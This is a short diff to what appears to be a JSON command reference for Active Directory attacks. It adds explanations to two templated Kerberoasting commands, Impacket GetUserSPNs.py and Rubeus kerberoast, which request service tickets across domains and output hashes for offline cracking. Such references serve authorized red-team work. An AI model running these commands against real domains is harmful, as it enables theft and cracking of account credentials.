@@ -170,11 +170,13 @@
   "variations": [
     {
       "label": "Pass-the-ticket auth",
-      "command": "GetUserSPNs.py -request -target-domain <foreign_domain> -k -no-pass <domain>/<user>"
+      "command": "GetUserSPNs.py -request -target-domain <foreign_domain> -k -no-pass <domain>/<user>",
+      "description": "Uses Impacket GetUserSPNs to perform Kerberoasting - requests service tickets for accounts with SPNs and outputs the TGS hashes for offline cracking."
     },
     {
       "label": "Rubeus cross-domain",
-      "command": ".\\Rubeus.exe kerberoast /domain:<foreign_domain> /nowrap"
+      "command": ".\\Rubeus.exe kerberoast /domain:<foreign_domain> /nowrap",
+      "description": "Uses Rubeus to perform Kerberoasting - requests service tickets for all accounts with SPNs and outputs the hashes for offline cracking. Runs in-memory on Windows without touching disk."
     }
   ],
   "steps": [
